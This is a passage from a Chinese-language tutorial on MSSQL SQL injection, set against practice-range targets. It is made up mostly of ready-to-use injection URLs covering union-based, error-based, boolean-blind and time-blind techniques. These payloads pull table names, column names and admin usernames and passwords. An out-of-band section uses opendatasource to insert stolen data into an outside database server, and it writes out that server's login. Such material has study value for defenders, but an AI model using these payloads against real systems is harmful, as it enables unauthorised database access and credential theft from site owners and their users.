# 使用 `not in` 获取下一条数据
通过以下SQL注入语句，可以使用 `not in` 从 `dbo.sysobjects` 表中获取表名和ID：
```
http://219.153.49.228:40574/new_list.asp?id=-2 union all select top 1 null, id, name, null from dbo.sysobjects where xtype='U' and id not in ('5575058') -- qwe
```

### 5. 查询列名
在查询列名时，因为已知表名的ID值，因此 `where` 子句只需使用 `id` 即可，无需再指定 `xtype`。
```
http://219.153.49.228:40574/new_list.asp?id=-2 union all select top 1 null, id, name, null from dbo.syscolumns where id='5575058' -- qwe
```
若要排除特定列名，如 `id` 和 `username`，则：
```
http://219.153.49.228:40574/new_list.asp?id=-2 union all select top 1 null, id, name, null from dbo.syscolumns where id='5575058' and name not in ('id', 'username') -- qwe
```

### 6. `information_schema` 表
除了 `sysobjects` 和 `syscolumns` 表外，MSSQL 还兼容 `information_schema`，用于存储数据库中的表名和字段名。但有时查询结果可能不准确，例如仅返回 `manager` 表。
```
http://219.153.49.228:40574/new_list.asp?id=-2 union all select null, '1', (select top 1 table_name from information_schema.tables where table_name <> 'manager'), null -- qwe
```
查询列名示例：
```
http://219.153.49.228:40574/new_list.asp?id=-2 union all select null, '1', (select top 1 column_name from information_schema.columns where table_name = 'manage'), null -- qwe
```
同样地，也可以排除某些列名：
```
http://219.153.49.228:40574/new_list.asp?id=-2 union all select null, '1', (select top 1 column_name from information_schema.columns where table_name = 'manage' and column_name not in ('id', 'username')), null -- qwe
```

### 7. 获取数据
从 `manage` 表中提取用户名和密码：
```
http://219.153.49.228:40574/new_list.asp?id=-2 union all select top 1 null, username, password, null from manage -- qwe
```
排除特定用户名（如 `admin_mz`）：
```
http://219.153.49.228:40574/new_list.asp?id=-2 union all select top 1 null, username, password, null from manage where username <> 'admin_mz' -- qwe
```

## 0x04 报错注入
由于 MSSQL 是强类型语言数据库，当等号两边的数据类型不一致时会报错，配合子查询即可实现报错注入。

### 1. 直接报错
利用类型不一致来触发错误并获取数据。
- 获取数据库库名：
  ```
  ?id=1' and 1=(select db_name()) -- qwe
  ```
- 获取第一个表名：
  ```
  ?id=1' and 1=(select top 1 name from dbo.sysobjects) -- qwe
  ```
- 将数据连接显示：
  ```
  ?id=1' and 1=stuff((select db_name() for xml path('')),1,0,'')--+
  ```

### 2. `convert()` 函数
将第二个参数转换为第一个参数指定的类型。
- 获取数据库库名：
  ```
  ?id=1' and 1=convert(int,(select db_name())) -- qwe
  ```
- 获取数据库版本：
  ```
  ?id=1' and 1=convert(int,(select @@version)) -- qwe
  ```

### 3. `cast()` 函数
将前一个表达式转换为后一个指定的数据类型。
- 查询当前数据库：
  ```
  ?id=1' and 1=(select cast(db_name() as int)) -- qe
  ```
- 查询第一个数据表：
  ```
  ?id=1' and 1=(select top 1 cast(name as int) from dbo.sysobjects) -- qe
  ```

### 4. 数据组合输出
- 组合输出数据表：
  ```
  ?id=1' and 1=stuff((select quotename(name) from dbo.sysobjects for xml path('')),1,0,'')--+
  ```
- 组合输出 `users` 表中的用户名：
  ```
  ?id=1' and 1=stuff((select quotename(username) from users for xml path('')),1,0,'')--+
  ```

## 0x05 布尔盲注
### 1. 查询数据库库名
- 库名长度为11：
  ```
  http://219.153.49.228:40768/new_list.asp?id=2 and len((select top 1 db_name()))=11
  ```
- 第一个字符的 ASCII 码为109：
  ```
  http://219.153.49.228:40768/new_list.asp?id=2 and ascii(substring((select top 1 db_name()),1,1))=109
  ```
  或者大于109：
  ```
  http://219.153.49.228:40768/new_list.asp?id=2 and ascii(substring((select top 1 db_name()),1,1))>109
  ```
- 第二个字符的 ASCII 码为111：
  ```
  http://219.153.49.228:40768/new_list.asp?id=2 and ascii(substring((select top 1 db_name()),2,1))=111
  ```
- 获取所有 ASCII 码后解码获取数据。

### 2. 查询表名
- 直接猜解字符串：
  ```
  http://219.153.49.228:40768/new_list.asp?id=2 and substring((select top 1 name from dbo.sysobjects where xtype='U'),1,1)='m'
  ```
  或者前六个字符为 `manage`：
  ```
  http://219.153.49.228:40768/new_list.asp?id=2 and substring((select top 1 name from dbo.sysobjects where xtype='U'),1,6)='manage'
  ```

## 0x06 延时盲注
### 1. 延时函数 `WAITFOR DELAY`
语法：`n` 表示延时几秒。
- 示例：
  ```
  WAITFOR DELAY '0:0:n' id=1 if (布尔盲注的判断语句) WAITFOR DELAY '0:0:5' -- qwe
  ```

### 2. 查询数据
- 判断如果第一个库的库名的第一个字符的 ASCII 码为109，则延时5秒：
  ```
  http://219.153.49.228:40768/new_list.asp?id=2 if (ascii(substring((select top 1 db_name()),1,1))=109) WAITFOR DELAY '0:0:5' -- qwe
  ```
- 判断如果第一个表的表名的第一个字符为 `m`，则延时5秒：
  ```
  http://219.153.49.228:40768/new_list.asp?id=2 if (substring((select top 1 name from dbo.sysobjects where xtype='U'),1,1)='m') WAITFOR DELAY '0:0:5' -- qwe
  ```

## 0x07 反弹注入
反弹注入是通过将数据发送到另一台数据库服务器来实现的，需要一台配置了 MSSQL 数据库的 VPS 服务器，并且需要开启堆叠注入。

### 1. 环境准备
- 打开靶场。
- 连接到 VPS 的 MSSQL 数据库，创建表 `test`，字段数与类型应与要查询的数据相同。例如，查询数据库库名时：
  ```sql
  CREATE TABLE test(name VARCHAR(255))
  ```

### 2. 获取数据库所有表
- 使用反弹注入将数据插入到表中：
  - 查询 `sysobjects` 表：
    ```
    ?id=1';insert into opendatasource('sqloledb','server=SQL5095.site4now.net,1433;uid=DB_14DC18D_test_admin;pwd=123456;database=DB_14DC18D_test').DB_14DC18D_test.dbo.test select name from dbo.sysobjects where xtype='U' -- qwe
    ```
  - 查询 `information_schema` 表：
    ```
    ?id=1';insert into opendatasource('sqloledb','server=SQL5095.site4now.net,1433;uid=DB_14DC18D_test_admin;pwd=123456;database=DB_14DC18D_test').DB_14DC18D_test.dbo.test select table_name from information_schema.tables -- qwe
    ```

### 3. 获取 `admin` 表中的所有列名
- 查询 `information_schema` 表：
  ```
  ?id=1';insert into opendatasource('sqloledb','server=SQL5095.site4now.net,1433;uid=DB_14DC18D_test_admin;pwd=123456;database=DB_14DC18D_test').DB_14DC18D_test.dbo.test select column_name from information_schema.columns where table_name='admin' -- qwe
  ```
- 查询 `syscolumns` 表：
  ```
  ?id=1';insert into opendatasource('sqloledb','server=SQL5095.site4now.net,1433;uid=DB_14DC18D_test_admin;pwd=123456;database=DB_14DC18D_test').DB_14DC18D_test.dbo.test select name from dbo.syscolumns where id=1977058079 -- qwe
  ```

### 4. 获取数据
- 创建新表 `data` 以存放三个字段：`id`、`username` 和 `passwd`：
  ```sql
  CREATE TABLE data(id INT, username VARCHAR(255), passwd VARCHAR(255))
  ```
- 获取 `admin` 表中的数据：
  ```
  ?id=1';insert into opendatasource('sqloledb','server=SQL5095.site4now.net,1433;uid=DB_14DC18D_test_admin;pwd=123456;database=DB_14DC18D_test').DB_14DC18D_test.dbo.data select id, username, passwd from admin -- qwe
  ```

## 0x08 总结
撰写本文耗时一周，主要时间花费在环境搭建及寻找在线靶场上。文章涵盖了显错注入、报错注入、盲注和反弹注入等多种 MSSQL 注入类型。靶场包括墨者学院、掌控安全以及 MSSQL-sqli-labs 靶场。实际攻击时还需考虑 WAF 绕过等问题。后续计划撰写一篇关于 WAF 绕过和提权的文章，敬请期待。